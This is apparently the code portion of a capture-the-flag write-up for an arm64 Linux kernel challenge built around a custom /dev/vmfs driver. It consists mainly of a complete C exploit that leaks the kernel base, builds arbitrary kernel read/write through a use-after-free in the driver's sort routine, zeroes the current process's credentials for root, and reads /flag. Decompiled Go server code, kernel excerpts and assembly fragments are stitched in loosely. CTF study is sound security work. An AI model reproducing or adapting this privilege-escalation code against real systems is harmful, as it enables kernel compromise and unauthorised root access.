 case VMFS_SORT_FILE:
 switch (argv.sort_option)
 {
 case VMFS_BUBBLE_SORT:
 bubble_sort();
 break;
 case VMFS_INSERT_SORT:
 insert_sort();
 break;
 case VMFS_SELECTION_SORT:
 selection_sort();
 break;
 case VMFS_MERGE_SORT:
 merge_sort();
 break;
 default:
 result = -1;
 break;
 }
 break;
 default:
 result = -1;
 break;
 }
 }

 mutex_unlock(&vmfs_lock);

 return result;
}
5* 5 2
2 5 5*
    #ifdef CONFIG_HARDENED_USERCOPY
/*
 * Rejects incorrectly sized objects and objects that are to be copied
 * to/from userspace but do not fall entirely within the containing slab
 * cache's usercopy region.
 *
 * Returns NULL if check passes, otherwise const char * to name of cache
 * to indicate an error.
 */
void __check_heap_object(const void *ptr, unsigned long n,
 const struct slab *slab, bool to_user)
{
 struct kmem_cache *s;
 unsigned int offset;
 bool is_kfence = is_kfence_address(ptr);

 ptr = kasan_reset_tag(ptr);

 /* Find object and usable object size. */
 s = slab->slab_cache;

 /* Reject impossible pointers. */
 if (ptr < slab_address(slab))
 usercopy_abort("SLUB object not in SLUB page?!", NULL,
 to_user, 0, n);

 /* Find offset within object. */
 if (is_kfence)
 offset = ptr - kfence_object_start(ptr);
 else
 offset = (ptr - slab_address(slab)) % s->size;

 /* Adjust for redzone and reject if within the redzone. */
 if (!is_kfence && kmem_cache_debug_flags(s, SLAB_RED_ZONE)) {
 if (offset < s->red_left_pad)
 usercopy_abort("SLUB object in left red zone",
 s->name, to_user, offset, n);
 offset -= s->red_left_pad;
 }

 /* Allow address range falling entirely within usercopy region. */
 if (offset >= s->useroffset &&
 offset - s->useroffset <= s->usersize &&
 n <= s->useroffset - offset + s->usersize)
 return;

 usercopy_abort("SLUB object", s->name, to_user, offset, n);
}
    #endif /* CONFIG_HARDENED_USERCOPY */
static inline void check_heap_object(const void *ptr, unsigned long n,
 bool to_user)
{
 unsigned long addr = (unsigned long)ptr;
 unsigned long offset;
 struct folio *folio;

 if (is_kmap_addr(ptr)) {
 offset = offset_in_page(ptr);
 if (n > PAGE_SIZE - offset)
 usercopy_abort("kmap", NULL, to_user, offset, n);
 return;
 }

 if (is_vmalloc_addr(ptr) && !pagefault_disabled()) {
 struct vmap_area *area = find_vmap_area(addr);

 if (!area)
 usercopy_abort("vmalloc", "no area", to_user, 0, n);

 if (n > area->va_end - addr) {
 offset = addr - area->va_start;
 usercopy_abort("vmalloc", NULL, to_user, offset, n);
 }
 return;
 }

 if (!virt_addr_valid(ptr))
 return;

 folio = virt_to_folio(ptr);

 if (folio_test_slab(folio)) {
 /* Check slab allocator for flags and size. */
 __check_heap_object(ptr, n, folio_slab(folio), to_user);
 } else if (folio_test_large(folio)) {
 offset = ptr - folio_address(folio);
 if (n > folio_size(folio) - offset)
 usercopy_abort("page alloc", NULL, to_user, offset, n);
 }
}
int pfn_is_map_memory(unsigned long pfn)
{
 phys_addr_t addr = PFN_PHYS(pfn);

 /* avoid false positives for bogus PFNs, see comment in pfn_valid() */
 if (PHYS_PFN(addr) != pfn)
 return 0;

 return memblock_is_map_memory(addr);
}
bool __init_memblock memblock_is_map_memory(phys_addr_t addr)
{
 int i = memblock_search(&memblock.memory, addr);

 if (i == -1)
 return false;
 return !memblock_is_nomap(&memblock.memory.regions[i]);
}
static inline bool memblock_is_nomap(struct memblock_region *m)
{
 return m->flags & MEMBLOCK_NOMAP;
}
enum memblock_flags {MEMBLOCK_NONE, MEMBLOCK_HOTPLUG, MEMBLOCK_MIRROR, MEMBLOCK_NOMAP = 4, MEMBLOCK_DRIVER_MANAGED = 8}
memblock_memory_init_regions[0].flags = MEMBLOCK_NOMAP
    #define _GNU_SOURCE
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include 
    #include <fcntl.h>
    #include <signal.h>
    #include <sys/wait.h>
    #include <sys/ioctl.h>

    #define VMFS_CREATE_FILE 0xff00
    #define VMFS_MOVE_TO_TRASH 0xff01
    #define VMFS_DELETE_FROM_TRASH 0xff02
    #define VMFS_WRITE_FILE 0xff03
    #define VMFS_READ_FILE 0xff04
    #define VMFS_SORT_FILE 0xff05

    #define VMFS_BUBBLE_SORT 1
    #define VMFS_INSERT_SORT 2
    #define VMFS_SELECTION_SORT 3
    #define VMFS_MERGE_SORT 4

struct user_argv
{
 size_t id;
 char *addr;
 size_t size;
 size_t choose_index;
 size_t sort_option;
};

struct node
{
 size_t id;
 size_t msg_len;
 char *msg;
};

int vmfs_fd = 0;
size_t kernel_base_addr = 0;
    #define REAL(addr) (kernel_base_addr - 0xffff800008000000 + (addr))
    #define INIT_TASK 0xffff800009ee4200

int leak()
{
 struct user_argv argv;
 char buf[0x100];

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x7352eda5;
 argv.size = 0x200;
 ioctl(vmfs_fd, VMFS_CREATE_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x7352eda5;
 argv.size = 0x200;
 ioctl(vmfs_fd, VMFS_CREATE_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x7352eda0;
 argv.size = 0x200;
 ioctl(vmfs_fd, VMFS_CREATE_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x7352eda5;
 argv.choose_index = 0;
 ioctl(vmfs_fd, VMFS_MOVE_TO_TRASH, &argv);

 open("/dev/ptmx", O_RDONLY);

 memset(&argv, 0, sizeof(argv));
 argv.sort_option = VMFS_SELECTION_SORT;
 ioctl(vmfs_fd, VMFS_SORT_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 memset(&buf, 0, sizeof(buf));
 argv.id = 0x7352eda5;
 argv.size = 0x100;
 argv.addr = buf;
 argv.choose_index = 1;
 ioctl(vmfs_fd, VMFS_READ_FILE, &argv);
 kernel_base_addr = *(size_t*)(buf + 0x20) - 0x7b6270;
 printf("kernel_base_addr: %#lxn", kernel_base_addr);

 return 0;
}

int construct_arbitrary_read_write()
{
 struct user_argv argv;

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b5;
 argv.size = 0x20;
 ioctl(vmfs_fd, VMFS_CREATE_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b5;
 argv.size = 0x20;
 ioctl(vmfs_fd, VMFS_CREATE_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b0;
 argv.size = 0x20;
 ioctl(vmfs_fd, VMFS_CREATE_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b5;
 argv.choose_index = 0;
 ioctl(vmfs_fd, VMFS_MOVE_TO_TRASH, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.sort_option = VMFS_SELECTION_SORT;
 ioctl(vmfs_fd, VMFS_SORT_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b6;
 argv.size = 0x200;
 ioctl(vmfs_fd, VMFS_CREATE_FILE, &argv);

 return 0;
}

int arbitrary_read(size_t dst, void *out_buf, size_t length)
{
 struct user_argv argv;
 char buf[0x100];
 struct node *nptr;

 memset(&argv, 0, sizeof(argv));
 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b5;
 argv.size = 0x20;
 argv.addr = buf;
 argv.choose_index = 1;
 memset(buf, 0, sizeof(buf));
 nptr = (struct node *)buf;
 nptr->id = 0x796041b6;
 nptr->msg_len = length;
 nptr->msg = (char *)(dst);
 ioctl(vmfs_fd, VMFS_WRITE_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b6;
 argv.size = length;
 argv.addr = out_buf;
 argv.choose_index = 0;
 ioctl(vmfs_fd, VMFS_READ_FILE, &argv);

 return 0;
}

int arbitrary_write(size_t dst, void *in_buf, size_t length)
{
 struct user_argv argv;
 char buf[0x100];
 struct node *nptr;

 memset(&argv, 0, sizeof(argv));
 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b5;
 argv.size = 0x20;
 argv.addr = buf;
 argv.choose_index = 1;
 memset(buf, 0, sizeof(buf));
 nptr = (struct node *)buf;
 nptr->id = 0x796041b6;
 nptr->msg_len = length;
 nptr->msg = (char *)(dst);
 ioctl(vmfs_fd, VMFS_WRITE_FILE, &argv);

 memset(&argv, 0, sizeof(argv));
 argv.id = 0x796041b6;
 argv.size = length;
 argv.addr = in_buf;
 argv.choose_index = 0;
 ioctl(vmfs_fd, VMFS_WRITE_FILE, &argv);

 return 0;
}

size_t get_current_task()
{
 size_t init_task = REAL(INIT_TASK), task = init_task;
 size_t result = 0;
 size_t name = 0;
 size_t out_result;
 int i = 0;

 #define NAME_OFFSET 0x680
 #define TASK_OFFSET 0x3a8

 while(result == 0 && i++ < 8)
 {
 out_result = 0;
 arbitrary_read(task + TASK_OFFSET + 8, &out_result, sizeof(out_result)) - TASK_OFFSET;
 task = out_result - TASK_OFFSET;
 printf("task: %#llxn", task);
 if(task == init_task)
 {
 break;
 }
 name = 0;
 arbitrary_read(task + NAME_OFFSET, &name, sizeof(name));
 printf("name: %sn", (char *)&name);
 if((name & 0xffff) == 0x6d76) // "vm"
 {
 result = task;
 }
 }

 return result;
}

int modify_current_cred()
{
 size_t current_task = 0;
 size_t value = 0;
 size_t current_cred = 0;
 int memblock_memory_init_regions_0_flag = 4;
 char buf[0x20];

 arbitrary_write(REAL(0xffff80000a2b31f8), &memblock_memory_init_regions_0_flag, sizeof(memblock_memory_init_regions_0_flag)); // memblock_memory_init_regions[0].flags

 current_task = get_current_task();
 if(current_task == 0)
 {
 fprintf(stderr, "Error: Not found current_taskn");
 kill(-1, SIGKILL);
 exit(EXIT_FAILURE);
 }
 printf("current_task: %#lxn", current_task);

 arbitrary_read(current_task + 0x668, ¤t_cred, sizeof(current_cred));
 printf("current_cred: %#lxn", current_cred);

 memset(buf, 0, sizeof(0));
 arbitrary_write(current_cred + 4, buf, sizeof(buf));

 printf("uid: %dn", getuid());

 return 0;
}

int readflag()
{
 int fd = 0;
 char buf[0x100];
 int result;

 setuid(0);

 fd = open("/flag", O_RDONLY);
 if(fd == -1)
 {
 perror("open");
 exit(EXIT_FAILURE);
 }

 memset(buf, 0, sizeof(buf));

 result = read(fd, buf, sizeof(buf)-1);
 printf("result: %dn", result);

 write(STDOUT_FILENO, buf, result);

 close(fd);

 return 0;
}

int main()
{
 setbuf(stdout, NULL);

 vmfs_fd = open("/dev/vmfs", O_RDONLY);
 if(vmfs_fd == -1)
 {
 perror("open");
 exit(EXIT_FAILURE);
 }

 leak();

 construct_arbitrary_read_write();

 modify_current_cred();

 readflag();

 return 0;
}
void __cdecl main_main()
{
 __int64 v0; // x28
 _QWORD *http_server; // x0
 __int64 v2; // x0
 __int64 v3; // x1
 __int64 v4; // x0
 void *server_handle; // [xsp+38h] [xbp-40h]
 __int64 v6[2]; // [xsp+40h] [xbp-38h] BYREF
 _QWORD v7[4]; // [xsp+50h] [xbp-28h] BYREF
 __int64 v8; // [xsp+78h] [xbp+0h] BYREF

 if ( (unsigned __int64)&v8 <= *(_QWORD *)(v0 + 16) )
 runtime_morestack_noctxt();
 main_initFs();
 v6[0] = (__int64)&type_string;
 v6[1] = (__int64)&off_2D7E60;
 fmt_Fprintln(&off_2D8F98, qword_45C3E8, v6, 1LL, 1LL);// "Server started ..."
 server_handle = runtime_newobject(&type_http_ServeMux);
 net_http___ServeMux__Handle(server_handle, aApiCreateFile, 16LL, &off_2D9438, off_293378);// 0x1F9A90, main.createFile
 net_http___ServeMux__Handle(server_handle, aApiWriteFile, 15LL, &off_2D9438, &off_293388);// 0x1F9E70, main.writeFile
 net_http___ServeMux__Handle(server_handle, aApiRunFile, 13LL, &off_2D9438, off_293380);// 0x1FA260, main.runFile
 http_server = runtime_newobject(&type_http_Server);
 http_server[1] = 5LL;
 *http_server = a8080;
 http_server[2] = &off_2D8E18;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(http_server + 3, server_handle);
 else
 http_server[3] = server_handle;
 v2 = net_http___Server__ListenAndServe(http_server);
 if ( v2 )
 {
 v7[2] = 0LL;
 v7[3] = 0LL;
 v7[0] = &type_string;
 v7[1] = &off_2D7E80;
 v4 = *(_QWORD *)(v2 + 8);
 v7[2] = v4;
 v7[3] = v3;
 fmt_Fprintln(&off_2D8F98, qword_45C3E8, v7, 2LL, 2LL);// "Error starting the server:"
 }
}

void __fastcall main_initFs()
{
 __int64 v0; // x28
 __int64 v1[2]; // [xsp+30h] [xbp-58h] BYREF
 __int64 v2[9]; // [xsp+40h] [xbp-48h] BYREF
 __int64 v3; // [xsp+88h] [xbp+0h] BYREF

 if ( (unsigned __int64)&v3 <= *(_QWORD *)(v0 + 16) )
 runtime_morestack_noctxt();
 v2[0] = 0x400000020LL;
 v2[1] = 0xC00000B704000015LL;
 v2[2] = 32LL;
 v2[3] = 0x11900020015LL;
 v2[4] = 0xDD00010015LL;
 v2[5] = 0x7FFF000000000006LL;
 v2[6] = 6LL;
 v1[0] = 7LL;
 v1[1] = (__int64)v2;
 syscall_Syscall(SYS_prctl, PR_SET_NO_NEW_PRIVS, 1LL);
 v2[7] = (__int64)v1;
 syscall_Syscall(SYS_prctl, PR_SET_SECCOMP, 2LL, v1);
}

void __fastcall main_createFile(ResponseWriter_table *Response_vtable, void *response, void *request)
{
 // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

 if ( (unsigned __int64)&v31 <= *(_QWORD *)(v3 + 16) )
 runtime_morestack_noctxt();
 v30 = Response_vtable->net_http_(_response)_Header(response);
 *(_OWORD *)v4 = net_textproto_CanonicalMIMEHeaderKey(aContentType, 12LL);
 v35 = v4[0];
 value = runtime_newobject(&type_string_array_1_ptr);
 *((_QWORD *)value + 1) = 16LL;
 *(_QWORD *)value = aApplicationJso;
 v6 = (void **)runtime_mapassign_faststr(&type_textproto_MIMEHeader, v30, v35, v4[1]);
 v6[1] = (void *)1;
 v6[2] = (void *)1;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v6, value);
 else
 *v6 = value;
 v29 = Response_vtable->net_http_(_response)_Header(response);
 *(_OWORD *)v7 = net_textproto_CanonicalMIMEHeaderKey(aAccessControlA_3, 27LL);
 v35 = v7[0];
 v8 = runtime_newobject(&type_string_array_1_ptr);
 v33 = v8;
 v8[1] = 1LL;
 *v8 = "*";
 v9 = (void **)runtime_mapassign_faststr(&type_textproto_MIMEHeader, v29, v35, v7[1]);
 v9[1] = (void *)1;
 v9[2] = (void *)1;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v9, v33);
 else
 *v9 = v33;
 v37 = (main::
Req *)runtime_newobject(&type_main_Req);
 v28 = *((_QWORD *)request + 9);
 v32 = runtime_convI2I(&type_io_Reader, *((_QWORD *)request + 8));
 v10 = runtime_newobject(&type_json_Decoder);
 *v10 = v32;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v10 + 1, v28);
 else
 v10[1] = v28;
 v11 = encoding_json___Decoder__Decode(v10, &type_main_Req_ptr, v37);
 if ( v11 )
 {
 v24 = (*(__int64 (__fastcall **)(__int64))(v11 + 24))(v12);
 net_http_Error(Response_vtable, response, v24, v25, 400LL);
 }
 else if ( v37->Size > 0x8000 || (*(_OWORD *)v14 = os_OpenFile(aDevVmfs, 9LL, 0LL, 0x180LL), v13 = v14[0], v14[1]) )
 {
 net_http_Error(Response_vtable, response, aInternalServer, 21LL, 500LL);
 }
 else
 {
 v31 = (_QWORD *)v14[0];
 Id = v37->Id;
 Size = v37->Size;
 v27[1] = 0LL;
 v27[3] = 0LL;
 v27[4] = 0LL;
 v27[0] = Id;
 v27[2] = Size;
 v36 = v27;
 if ( v14[0] )
 {
 if ( (*(_BYTE *)(*(_QWORD *)v14[0] + 80LL) & 1) != 0 )
 {
 internal_poll___FD__SetBlocking(*(_QWORD *)v14[0]);
 v13 = (__int64)v31;
 }
 v17 = *(_QWORD *)(*(_QWORD *)v13 + 16LL);
 }
 else
 {
 v17 = -1LL;
 }
 syscall_Syscall(SYS_ioctl, v17, 0xFF00LL, v36);
 if ( v31 )
 {
 v26 = v18;
 os___file__close(*v31);
 v18 = v26;
 }
 if ( v18
 || (v38 = aSuccess,
 v39 = 7LL,
 v19 = runtime_convTstring(aSuccess),
 v20 = encoding_json_Marshal(&type_main_Message, v19),
 v23) )
 {
 net_http_Error(Response_vtable, response, aInternalServer, 21LL, 500LL);
 }
 else
 {
 Response_vtable->net_http_(_response)_Write(response, v20, v21, v22);
 }
 }
}

void __fastcall main_writeFile(ResponseWriter_table *Response_vtable, void *response, void *request)
{
 // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

 if ( (unsigned __int64)&v33 <= *(_QWORD *)(v3 + 16) )
 runtime_morestack_noctxt();
 v32 = Response_vtable->net_http_(_response)_Header(response);
 *(_OWORD *)v4 = net_textproto_CanonicalMIMEHeaderKey(aContentType, 12LL);
 v37 = v4[0];
 v5 = runtime_newobject(&type_string_array_1_ptr);
 value = (__int64)v5;
 v5[1] = 16LL;
 *v5 = aApplicationJso;
 v6 = (__int64 *)runtime_mapassign_faststr(&type_textproto_MIMEHeader, v32, v37, v4[1]);
 v6[1] = 1LL;
 v6[2] = 1LL;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v6, value);
 else
 *v6 = value;
 v31 = Response_vtable->net_http_(_response)_Header(response);
 *(_OWORD *)v7 = net_textproto_CanonicalMIMEHeaderKey(aAccessControlA_3, 27LL);
 v37 = v7[0];
 v8 = runtime_newobject(&type_string_array_1_ptr);
 v35 = (__int64)v8;
 v8[1] = 1LL;
 *v8 = "*";
 v9 = (__int64 *)runtime_mapassign_faststr(&type_textproto_MIMEHeader, v31, v37, v7[1]);
 v9[1] = 1LL;
 v9[2] = 1LL;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v9, v35);
 else
 *v9 = v35;
 v39 = (main::
Req *)runtime_newobject(&type_main_Req);
 v30 = *((_QWORD *)request + 9);
 v34 = runtime_convI2I(&type_io_Reader, *((_QWORD *)request + 8));
 v10 = runtime_newobject(&type_json_Decoder);
 *v10 = v34;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v10 + 1, v30);
 else
 v10[1] = v30;
 v11 = encoding_json___Decoder__Decode(v10, &type_main_Req_ptr, v39);
 if ( v11 )
 {
 v26 = (*(__int64 (__fastcall **)(__int64))(v11 + 24))(v12);
 net_http_Error(Response_vtable, response, v26, v27, 400LL);
 }
 else if ( v39->Size > 8 * v39->Data.len
 || (*(_OWORD *)v14 = os_OpenFile(aDevVmfs, 9LL, 0LL, 0600LL), v13 = v14[0], v14[1]) )
 {
 net_http_Error(Response_vtable, response, aInternalServer, 21LL, 500LL);
 }
 else
 {
 v33 = (_QWORD *)v14[0];
 v15 = v39->Id;
 v16 = v39->Data.data;
 v17 = v39->Size;
 v18 = v39->ChooseIndex;
 v29[4] = 0LL;
 v29[0] = v15;
 v29[1] = (__int64)v16;
 v29[2] = v17;
 v29[3] = v18;
 v38 = v29;
 if ( v14[0] )
 {
 if ( (*(_BYTE *)(*(_QWORD *)v14[0] + 80LL) & 1) != 0 )
 {
 internal_poll___FD__SetBlocking(*(_QWORD *)v14[0]);
 v13 = (__int64)v33;
 }
 v19 = *(_QWORD *)(*(_QWORD *)v13 + 16LL);
 }
 else
 {
 v19 = -1LL;
 }
 syscall_Syscall(SYS_ioctl, v19, 0xFF03LL, v38);
 if ( v33 )
 {
 v28 = v20;
 os___file__close(*v33);
 v20 = v28;
 }
 if ( v20
 || (v40 = aSuccess,
 v41 = 7LL,
 v21 = runtime_convTstring(aSuccess),
 v22 = encoding_json_Marshal(&type_main_Message, v21),
 v25) )
 {
 net_http_Error(Response_vtable, response, aInternalServer, 21LL, 500LL);
 }
 else
 {
 Response_vtable->net_http_(_response)_Write(response, v22, v23, v24);
 }
 }
}

void __fastcall main_runFile(ResponseWriter_table *Response_vtable, void *response, void *request)
{
 // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

 if ( (unsigned __int64)&v52 < 0x18170 || (unsigned __int64)&v34[15] <= *(_QWORD *)(v3 + 16) )
 {
 v53 = Response_vtable;
 v54 = response;
 v55 = request;
 runtime_morestack_noctxt();
 }
 v55 = request;
 v53 = Response_vtable;
 v54 = response;
 v41 = Response_vtable->net_http_(_response)_Header(response);
 *(_OWORD *)v4 = net_textproto_CanonicalMIMEHeaderKey(aContentType, 12LL);
 v36 = v4[1];
 v46 = v4[0];
 v5 = runtime_newobject(&type_string_array_1_ptr);
 v45 = v5;
 v5[1] = 16LL;
 *v5 = aApplicationJso;
 v6 = (_QWORD *)runtime_mapassign_faststr(&type_textproto_MIMEHeader, v41, v46, v36);
 v6[1] = 1LL;
 v6[2] = 1LL;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v6, v45);
 else
 *v6 = v45;
 v40 = v53->net_http_(_response)_Header(v54);
 *(_OWORD *)v7 = net_textproto_CanonicalMIMEHeaderKey(aAccessControlA_3, 27LL);
 v36 = v7[1];
 v46 = v7[0];
 v8 = runtime_newobject(&type_string_array_1_ptr);
 v44 = v8;
 v8[1] = 1LL;
 *v8 = "*";
 v9 = (_QWORD *)runtime_mapassign_faststr(&type_textproto_MIMEHeader, v40, v46, v36);
 v9[1] = 1LL;
 v9[2] = 1LL;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v9, v44);
 else
 *v9 = v44;
 v48 = (main::
Req *)runtime_newobject(&type_main_Req);
 v39 = v55[9];
 v43 = runtime_convI2I(&type_io_Reader, v55[8]);
 v10 = runtime_newobject(&type_json_Decoder);
 *v10 = v43;
 if ( dword_4927C0 )
 runtime_gcWriteBarrier(v10 + 1, v39);
 else
 v10[1] = v39;
 v11 = encoding_json___Decoder__Decode(v10, &type_main_Req_ptr, v48);
 if ( v11 )
 {
 v32 = (*(__int64 (__fastcall **)(__int64))(v11 + 24))(v12);
 net_http_Error(v53, v54, v32, v33, 400LL);
 }
 else
 {
 *(_OWORD *)v14 = os_OpenFile(aDevVmfs, 9LL, 0LL, 0600LL);
 v13 = v14[0];
 if ( v14[1] )
 goto LABEL_31;
 v42 = (_QWORD *)v14[0];
 v15 = regs_and_code;
 do
 {
 *v15 = 0LL;
 v15[1] = 0LL;
 v15 += 2;
 }
 while ( (__int64)v15 <= (__int64)&v51.len );
 v16 = memory;
 do
 {
 *v16 = 0LL;
 v16[1] = 0LL;
 v16 += 2;
 }
 while ( (__int64)v16 <= (__int64)&memory[4094] );
 v51.data = memory;
 v51.len = 4096LL;
 v51.cap = 4096LL;
 v17 = v48->Id;
 v18 = v48->Size;
 v19 = v48->ChooseIndex;
 v37[4] = 0LL;
 v37[0] = v17;
 v37[1] = ®s_and_code[17];
 v37[2] = v18;
 v37[3] = v19;
 v47 = v37;
 if ( v14[0] )
 {
 if ( (*(_BYTE *)(*(_QWORD *)v14[0] + 80LL) & 1) != 0 )
 {
 internal_poll___FD__SetBlocking(*(_QWORD *)v14[0]);
 v13 = (__int64)v42;
 }
 v20 = *(_QWORD *)(*(_QWORD *)v13 + 16LL);
 }
 else
 {
 v20 = -1LL;
 }
 syscall_Syscall(SYS_ioctl, v20, 0xFF04LL, v47);
 if ( v42 )
 {
 v35 = v21;
 os___file__close(*v42);
 v21 = v35;
 }
 if ( v21 )
 {
LABEL_31:
 net_http_Error(v53, v54, aInternalServer, 21LL, 500LL);
 }
 else
 {
 v22 = v34;
 v23 = regs_and_code;
 do
 {
 v24 = *v23;
 v25 = v23[1];
 v23 += 2;
 *v22 = v24;
 v22[1] = v25;
 v22 += 2;
 }
 while ( (__int64)v23 <= (__int64)&v51.len );
 v26 = main_runVM();
 v49[0] = aSuccess;
 v49[1] = 7LL;
 v49[2] = v26;
 v27 = runtime_convT(&type_main_VmMessage, v49);
 v28 = encoding_json_Marshal(&type_main_VmMessage, v27);
 if ( v31 )
 net_http_Error(v53, v54, aInternalServer, 21LL, 500LL);
 else
 v53->net_http_(_response)_Write(v54, v28, v29, v30);
 }
 }
}
api post interface: {"Id": uint64, "Size": uint64, "ChooseIndex": uint64, "Data": uint64[]}
// {"Id": 0, "Size": 1, "ChooseIndex": 0, "Data": [1, 2]}

url: ?:
8080/api/create-file
 assert(Size <= 0x8000);
 gofile_obj = os.OpenFile("/dev/vmfs", 0, 0o600);
 sys_ioctl(gofile_obj->fd, 0xFF00, &(struct_to_kernel) {Id, 0, Size, 0, 0});
 os.(_file).close(*gofile_obj);

url: ?:
8080/api/write-file:
 assert(Size <= 8 * Data.length);
 gofile_obj = os.OpenFile("/dev/vmfs", 0, 0o600);
 sys_ioctl(gofile_obj->fd, 0xFF03, &(struct_to_kernel) {Id, Data.ptr, Size, ChooseIndex, 0});
 os.(_file).close(*gofile_obj);

url: ?:
8080/api/run-file:
 gofile_obj = os.OpenFile("/dev/vmfs", 0, 0o600);
 sys_ioctl(gofile_obj->fd, 0xFF04, &(struct_to_kernel) {Id, output_data, Size, ChooseIndex, 0});
 os.(_file).close(*gofile_obj);
 retval = main.runVM(output_data); // uint64[]
 Write({"Text": "success", "Return": retval});
struct struct_to_kernel {
 uint64 Id;
 uint64* Data;
 uint64 Size;
 uint64 ChooseIndex;
 uint64 method;
};

ff00: create(Id, Size)
ff01: mov_to_trash(Id, ChooseIndex)
ff02: delete_from_trash(Id, ChooseIndex)
ff03: set_data(Id, Size, ChooseIndex, Data)
ff04: get_data(Id, Size, ChooseIndex, Data)
ff05: sort(method) // 3: select sort
v4 = (object *)kmalloc_trace(MEMORY[0x33E0], 0xCC0LL, 0x18LL);
 v5 = v4;
 if ( v4 )
 {
 v4->addr = 0LL;
 v4->Id = 0x636DB8C2LL;
 v4->Size = 0x10000LL;
 v6 = (uint64 *)kmalloc_large(0x10000LL, 0xCC0LL);
 v5->addr = v6;
 if ( v6 )
 {
 memset(v6, 0, 0x10000uLL);
 list[0] = v5;
 }
 }
.text:
000000000007347C LDP X25, X26, [SP,#0xC8]
.text:
0000000000073480 LDP X23, X24, [SP,#0xB8]
.text:
0000000000073484 LDP X21, X22, [SP,#0xA8]
.text:
0000000000073488 LDP X19, X20, [SP,#0x98]
.text:
000000000007348C LDP X16, X17, [SP,#0x88]
.text:
0000000000073490 LDP X14, X15, [SP,#0x78]
.text:
0000000000073494 LDP X12, X13, [SP,#0x68]
.text:
0000000000073498 LDP X10, X11, [SP,#0x58]
.text:
000000000007349C LDP X8, X9, [SP,#0x48]
.text:
00000000000734A0 LDP X6, X7, [SP,#0x38]
.text:
00000000000734A4 LDP X4, X5, [SP,#0x28]
.text:
00000000000734A8 LDP X2, X3, [SP,#0x18]
.text:
00000000000734AC LDP X0, X1, [SP,#8]
.text:
00000000000734B0 LDR X30, [SP,#0x1F0]
.text:
00000000000734B4 LDUR X29, [SP,#-8]
.text:
00000000000734B8 LDR X27, [SP]
.text:
00000000000734BC ADD SP
PRINT_AND_EXECUTE(dev_alloc(2, 0xc0););
 PRINT_AND_EXECUTE(dev_alloc(2, 0xc0););
 PRINT_AND_EXECUTE(dev_alloc(1, 0xc0););
 PRINT_AND_EXECUTE(dev_alloc(1, 0xc0););
 PRINT_AND_EXECUTE(dev_free(2, 1););
 PRINT_AND_EXECUTE(dev_select_sort(););
 PRINT_AND_EXECUTE(dev_free(2, 0););
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]